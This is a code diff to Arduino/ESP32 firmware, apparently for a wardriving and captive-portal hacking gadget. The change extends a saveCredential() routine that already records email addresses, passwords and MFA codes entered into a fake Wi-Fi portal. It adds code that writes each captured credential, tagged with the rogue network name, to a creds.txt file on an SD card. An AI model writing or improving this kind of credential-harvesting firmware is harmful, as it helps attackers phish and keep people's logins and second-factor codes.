@@ -13,6 +13,8 @@
 #include "nuke_icon.h"
 #include "wardriving.h"
 #include "gps_module.h"
+#include "spi_manager.h"
+#include <SD.h>
 #include <Preferences.h>
 #include <arduinoFFT.h>
 
@@ -5447,6 +5449,22 @@ static void saveCredential(const char* email, const char* password, const char* 
     if (count < MAX_CREDS) count++;
     EEPROM.write(COUNT_ADDR, count);
     EEPROM.commit();
+
+    // Append to SD card for persistent storage
+    spiDeselect();
+    if (SD.begin(SD_CS)) {
+        File f = SD.open("/creds.txt", FILE_APPEND);
+        if (f) {
+            f.printf("%s | %s | %s | %s\n",
+                     customSSID,
+                     email ? email : "",
+                     password ? password : "",
+                     mfa ? mfa : "");
+            f.close();
+        }
+        SD.end();
+    }
+    spiDeselect();
 
     #if CYD_DEBUG
     Serial.printf("[PORTAL] Saved cred: %s / %s / %s\n",
